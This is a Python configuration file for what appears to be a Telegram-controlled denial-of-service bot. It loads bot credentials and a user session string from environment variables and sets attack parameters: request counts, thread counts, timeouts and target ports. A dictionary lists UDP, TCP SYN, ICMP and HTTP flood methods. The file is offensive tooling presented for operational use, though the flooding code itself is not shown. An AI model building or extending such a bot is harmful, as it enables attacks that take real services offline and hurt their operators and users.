"""
Production Configuration for VC Monitor Bot
All sensitive values loaded from environment variables
"""

import os
import sys
from typing import Optional


class Config:
    """Configuration class with validation"""
    
    # Telegram API
    API_ID: int = int(os.environ.get("API_ID", 0))
    API_HASH: str = os.environ.get("API_HASH", "")
    BOT_TOKEN: str = os.environ.get("BOT_TOKEN", "")
    SESSION_STRING: str = os.environ.get("SESSION_STRING", "")
    
    # Admin
    ADMIN_USER_ID: int = int(os.environ.get("ADMIN_USER_ID", 0))
    
    # Attack Settings (Fixed - Immutable)
    MAX_REQUESTS: int = int(os.environ.get("MAX_REQUESTS", 100000))
    THREAD_COUNT: int = int(os.environ.get("THREAD_COUNT", 100))
    ATTACK_TIMEOUT: int = int(os.environ.get("ATTACK_TIMEOUT", 300))
    ATTACK_PORT: int = int(os.environ.get("ATTACK_PORT", 80))
    
    # Monitoring
    VC_CHECK_INTERVAL: int = int(os.environ.get("VC_CHECK_INTERVAL", 10))
    MONITORING_MODE: bool = os.environ.get("MONITORING_MODE", "true").lower() == "true"
    
    # Bot Settings
    SESSION_NAME: str = "vc_bot_session"
    LOG_LEVEL: str = os.environ.get("LOG_LEVEL", "INFO")
    
    @classmethod
    def validate(cls) -> bool:
        """Validate all required configuration"""
        required = {
            "API_ID": cls.API_ID,
            "API_HASH": cls.API_HASH,
            "SESSION_STRING": cls.SESSION_STRING,
            "BOT_TOKEN": cls.BOT_TOKEN,
            "ADMIN_USER_ID": cls.ADMIN_USER_ID,
        }
        
        missing = [k for k, v in required.items() if not v]
        
        if missing:
            print(f"[ERROR] Missing required environment variables: {', '.join(missing)}")
            return False
            
        if cls.ADMIN_USER_ID == 0:
            print("[ERROR] ADMIN_USER_ID must be a valid Telegram user ID")
            return False
            
        print(f"[CONFIG] Loaded successfully")
        print(f"[CONFIG] Admin ID: {cls.ADMIN_USER_ID}")
        print(f"[CONFIG] Max Requests: {cls.MAX_REQUESTS:,}")
        print(f"[CONFIG] Threads: {cls.THREAD_COUNT}")
        return True


# Attack Methods Configuration
ATTACK_METHODS = {
    "udp": {"name": "UDP Flood", "port": 53, "description": "High-volume UDP packets"},
    "tcp": {"name": "TCP SYN Flood", "port": 80, "description": "TCP connection exhaustion"},
    "icmp": {"name": "ICMP Flood", "port": 0, "description": "Ping flood attack"},
    "http": {"name": "HTTP Flood", "port": 80, "description": "Layer 7 request flood"},
}
